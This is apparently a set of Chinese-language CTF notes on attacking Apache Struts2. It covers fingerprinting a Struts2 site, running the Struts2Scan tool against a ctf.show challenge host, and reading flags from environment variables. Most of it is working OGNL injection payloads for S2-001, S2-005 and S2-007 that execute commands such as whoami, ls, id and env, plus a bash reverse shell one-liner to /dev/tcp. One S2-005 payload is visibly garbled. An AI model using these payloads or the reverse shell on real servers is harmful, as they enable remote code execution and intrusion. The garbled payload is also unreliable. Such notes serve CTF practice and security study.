# 判断strust2方法
```
常规的办法有：

1、通过页面回显的错误消息来判断，页面不回显错误消息时则无效。
2、通过网页后缀来判断，如.do.action，有可能不准。
3、判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true。

其它的方法：通过 actionErrors。要求是对应的 Action 需要继承自 ActionSupport 类。

利用方法：如原始 URL 为 https://threathunter.org/则检测所用的 URL 为
https://threathunter.org/?actionErrors=1111

如果返回的页面出现异常，则可以认定为目标是基于 Struts2 构建的。异常包括但不限于以下几种现象：
1、 页面直接出现 404 或者 500 等错误。
2、 页面上输出了与业务有关错误消息，或者 1111 被回显到了页面上。
3、 页面的内容结构发生了明显的改变。
4、 页面发生了重定向。
```

**可以使用工具Struts2Scan.py**
[https://github.com/Vancomycin-g/Struts2Scan/](https://github.com/Vancomycin-g/Struts2Scan/)
```
python Struts2Scan.py -u http://9143263b-fae3-4a8c-8d7d-03f229579cac.challenge.ctf.show/S2-005/example/HelloWorld.action

先扫除漏洞，再具体执行

python Struts2Scan.py -u http://9143263b-fae3-4a8c-8d7d-03f229579cac.challenge.ctf.show/S2-005/example/HelloWorld.action -n S2-005 -e
```

flag有可能在环境变量当中，使用env命令查看环境变量的配置

**漏洞利用：**
```
bash -i >& /dev/tcp/x.x.x.x/port 0>&1
```

# S2-001

struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据。
```
|获取tomcat路径|
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}

|获取web路径|
|%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}|

|命令执行|
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

# S2-003

用unicode或8进制绕过

# S2-005

```
poc

redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27ls%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}

redirect:${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#s=new java.util.Scanner((new java.lang.ProcessBuilder('id'.toString().split('\\s'))).start().getInputStream()).useDelimiter('\\AAAA'),#str=#s.hasNext()?#s.next():'',#resp=#context.get('co.setCharacterEncod'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resping('UTF-8'),#resp.getWriter().println(#str),#resp.getWriter().flush(),#resp.getWriter().close()}
```

**S2-007**
```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream())) + '
```

